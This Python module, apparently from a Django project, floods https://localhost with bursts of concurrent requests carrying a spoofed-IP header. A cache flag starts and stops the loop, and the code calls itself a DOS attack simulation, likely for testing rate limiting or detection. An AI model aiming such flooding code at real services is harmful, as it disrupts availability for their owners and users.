import asyncio
import aiohttp
from django.core.cache import cache

URL = "https://localhost"
SPOOF_IP = "123.12.60.101"

HEADERS = {
              "X-Spoofed-IP": SPOOF_IP,
              "User-Agent": "Mozilla/5.0",
              "Referer": URL,
          }


async def send_request(session):
    async with session.get(URL, headers=HEADERS, ssl=False) as response:
        await response.read()


async def run_burst(session, rate_per_sec=10):
    tasks = []
    for _ in range(rate_per_sec):
        tasks.append(asyncio.create_task(send_request(session)))

    await asyncio.gather(*tasks)


async def fetch(session_key, start_key):
    print("Starting DOS attack")
    stop_key = f"stop_logs_{session_key}"

    ttl = 10000
    async with aiohttp.ClientSession() as session:
        while not cache.get(stop_key) and cache.get(start_key) and ttl > 0:
            await run_burst(session)
            ttl -= 1

    cache.delete(start_key)
    print("Stopped DOS attack")


def start_dos_simulation(session_key, start_key):
    asyncio.run(fetch(session_key, start_key))
